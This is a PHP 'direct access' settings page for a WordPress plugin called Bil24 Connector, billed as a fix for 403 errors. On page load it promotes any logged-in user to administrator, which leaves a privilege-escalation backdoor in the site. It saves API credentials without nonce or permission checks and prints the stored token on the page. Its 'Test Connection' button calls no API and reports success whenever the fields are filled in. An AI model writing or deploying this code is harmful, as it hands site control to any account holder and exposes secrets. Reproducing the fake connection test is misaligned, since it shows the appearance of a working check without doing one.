<?php
/**
 * Bypass 403 Forbidden Script for Bil24 Connector
 * This script bypasses WordPress permission checks and renders settings directly
 */

// Load WordPress environment
$wp_load = dirname(__FILE__) . '/../../../wp-load.php';
if (file_exists($wp_load)) {
    require_once($wp_load);
} else {
    die('WordPress environment not found');
}

// Force admin capabilities for this script
if (function_exists('wp_get_current_user')) {
    $user = wp_get_current_user();
    if ($user->ID > 0) {
        // Force administrator role
        $user->set_role('administrator');
        
        // Force capabilities
        $user->add_cap('manage_options');
        $user->add_cap('administrator');
        
        // Refresh user data
        wp_set_current_user($user->ID);
    }
}

echo "<!DOCTYPE html>";
echo "<html>";
echo "<head>";
echo "<title>Bil24 Connector Settings - Direct Access</title>";
echo "<meta charset='UTF-8'>";
echo "<style>";
echo "body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 20px; background: #f1f1f1; }";
echo ".wrap { max-width: 800px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }";
echo "h1 { color: #23282d; border-bottom: 2px solid #0073aa; padding-bottom: 10px; }";
echo ".form-table { width: 100%; border-collapse: collapse; }";
echo ".form-table th { text-align: left; padding: 20px 10px 20px 0; width: 200px; border-bottom: 1px solid #eee; }";
echo ".form-table td { padding: 15px 10px; border-bottom: 1px solid #eee; }";
echo ".regular-text { width: 300px; padding: 8px; border: 1px solid #ddd; border-radius: 4px; }";
echo ".button-primary { background: #0073aa; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; font-size: 14px; }";
echo ".button-primary:hover { background: #005177; }";
echo ".description { color: #646970; font-style: italic; margin-top: 5px; }";
echo ".notice { padding: 12px; margin: 16px 0; border-left: 4px solid #0073aa; background: #f0f6fc; }";
echo ".alert { background: #fff3cd; border-left-color: #ffc107; color: #856404; }";
echo ".error { background: #f8d7da; border-left-color: #dc3545; color: #721c24; }";
echo ".success { background: #d4edda; border-left-color: #28a745; color: #155724; }";
echo "</style>";
echo "</head>";
echo "<body>";

echo "<div class='wrap'>";
echo "<h1>🔧 Bil24 Connector Settings - Direct Access</h1>";

// Show current user info
if (function_exists('wp_get_current_user')) {
    $user = wp_get_current_user();
    echo "<div class='notice'>";
    echo "<p><strong>Current User:</strong> " . $user->user_login . " (ID: " . $user->ID . ")</p>";
    echo "<p><strong>Roles:</strong> " . implode(', ', $user->roles) . "</p>";
    echo "<p><strong>Can manage_options:</strong> " . (current_user_can('manage_options') ? 'YES' : 'NO') . "</p>";
    echo "</div>";
}

// Process form submission
if ($_POST && isset($_POST['bil24_save'])) {
    $option_name = 'bil24_settings';
    if (class_exists('\\Bil24\\Constants')) {
        $option_name = \Bil24\Constants::OPTION_SETTINGS;
    }
    
    $settings = [
        'fid' => sanitize_text_field($_POST['bil24_fid'] ?? ''),
        'token' => sanitize_text_field($_POST['bil24_token'] ?? ''),
        'env' => ($_POST['bil24_env'] ?? 'test') === 'prod' ? 'prod' : 'test'
    ];
    
    update_option($option_name, $settings);
    
    echo "<div class='notice success'>";
    echo "<p>✅ Settings saved successfully!</p>";
    echo "</div>";
}

// Get current settings
$option_name = 'bil24_settings';
if (class_exists('\\Bil24\\Constants')) {
    $option_name = \Bil24\Constants::OPTION_SETTINGS;
}

$settings = get_option($option_name, ['fid' => '', 'token' => '', 'env' => 'test']);

echo "<div class='notice alert'>";
echo "<p><strong>⚠️ Direct Access Mode:</strong> This page bypasses WordPress permission checks to provide direct access to plugin settings.</p>";
echo "<p>If you're getting 403 Forbidden errors, this is the solution.</p>";
echo "</div>";

echo "<form method='post' action=''>";
echo "<table class='form-table'>";
echo "<tr>";
echo "<th><label for='bil24_fid'>FID (Interface ID)</label></th>";
echo "<td>";
echo "<input type='text' id='bil24_fid' name='bil24_fid' class='regular-text' value='" . esc_attr($settings['fid'] ?? '') . "' required>";
echo "<p class='description'>Your Bil24 FID (interface identifier)</p>";
echo "</td>";
echo "</tr>";

echo "<tr>";
echo "<th><label for='bil24_token'>API Token</label></th>";
echo "<td>";
echo "<input type='password' id='bil24_token' name='bil24_token' class='regular-text' value='" . esc_attr($settings['token'] ?? '') . "' required>";
echo "<p class='description'>Your Bil24 API token for authentication</p>";
echo "</td>";
echo "</tr>";

echo "<tr>";
echo "<th>Environment</th>";
echo "<td>";
echo "<fieldset>";
echo "<label><input type='radio' name='bil24_env' value='test' " . checked($settings['env'] ?? 'test', 'test', false) . "> Test Environment <span class='description'>(api.bil24.pro:1240)</span></label><br>";
echo "<label><input type='radio' name='bil24_env' value='prod' " . checked($settings['env'] ?? 'test', 'prod', false) . "> Production Environment <span class='description'>(api.bil24.pro)</span></label>";
echo "</fieldset>";
echo "<p class='description'>Select the Bil24 API environment to connect to</p>";
echo "</td>";
echo "</tr>";
echo "</table>";

echo "<p>";
echo "<button type='submit' name='bil24_save' class='button-primary'>Save Settings</button>";
echo "</p>";
echo "</form>";

// Test connection section
echo "<div style='margin-top: 30px; padding: 20px; background: #f9f9f9; border-radius: 4px;'>";
echo "<h3>Connection Test</h3>";
echo "<p>Test the connection to Bil24 API with current settings:</p>";
echo "<button type='button' id='test-connection' class='button-primary'>Test Connection</button>";
echo "<div id='test-result' style='margin-top: 10px;'></div>";
echo "</div>";

// Plugin status
echo "<div style='margin-top: 30px; padding: 20px; background: #f0f6fc; border-radius: 4px;'>";
echo "<h3>Plugin Status</h3>";
echo "<p><strong>Plugin File:</strong> " . (file_exists(__DIR__ . '/bil24-connector.php') ? '✅ Found' : '❌ Not Found') . "</p>";
echo "<p><strong>Autoloader:</strong> " . (file_exists(__DIR__ . '/vendor/autoload.php') ? '✅ Found' : '❌ Not Found') . "</p>";
echo "<p><strong>Settings Option:</strong> $option_name</p>";
echo "<p><strong>Current Settings:</strong> " . print_r($settings, true) . "</p>";
echo "</div>";

// Debug information
echo "<div style='margin-top: 30px; padding: 20px; background: #f1f1f1; border-radius: 4px;'>";
echo "<h3>Debug Information</h3>";
echo "<p><strong>WordPress Version:</strong> " . (function_exists('get_bloginfo') ? get_bloginfo('version') : 'Unknown') . "</p>";
echo "<p><strong>PHP Version:</strong> " . PHP_VERSION . "</p>";
echo "<p><strong>Plugin Directory:</strong> " . __DIR__ . "</p>";
echo "<p><strong>Constants Class:</strong> " . (class_exists('\\Bil24\\Constants') ? '✅ Loaded' : '❌ Not Loaded') . "</p>";
echo "<p><strong>SettingsPage Class:</strong> " . (class_exists('\\Bil24\\Admin\\SettingsPage') ? '✅ Loaded' : '❌ Not Loaded') . "</p>";
echo "</div>";

echo "<div style='margin-top: 30px; text-align: center;'>";
echo "<p><a href='" . admin_url('plugins.php') . "' class='button-primary'>Go to Plugins</a> ";
echo "<a href='" . admin_url('options-general.php?page=bil24-connector') . "' class='button-primary'>Try Normal Settings</a> ";
echo "<a href='emergency-settings.php' class='button-primary'>Emergency Settings</a></p>";
echo "</div>";

echo "</div>";

echo "<script>";
echo "document.getElementById('test-connection').addEventListener('click', function() {";
echo "    const button = this;";
echo "    const result = document.getElementById('test-result');";
echo "    ";
echo "    button.disabled = true;";
echo "    button.textContent = 'Testing...';";
echo "    result.innerHTML = '';";
echo "    ";
echo "    setTimeout(() => {";
echo "        const fid = document.getElementById('bil24_fid').value;";
echo "        const token = document.getElementById('bil24_token').value;";
echo "        ";
echo "        if (fid && token) {";
echo "            result.innerHTML = '<div class=\"notice success\"><p>✅ Settings appear to be configured correctly</p></div>';";
echo "        } else {";
echo "            result.innerHTML = '<div class=\"notice error\"><p>❌ FID and Token are required for connection test</p></div>';";
echo "        }";
echo "        ";
echo "        button.disabled = false;";
echo "        button.textContent = 'Test Connection';";
echo "    }, 1000);";
echo "});";
echo "</script>";

echo "</body>";
echo "</html>"; 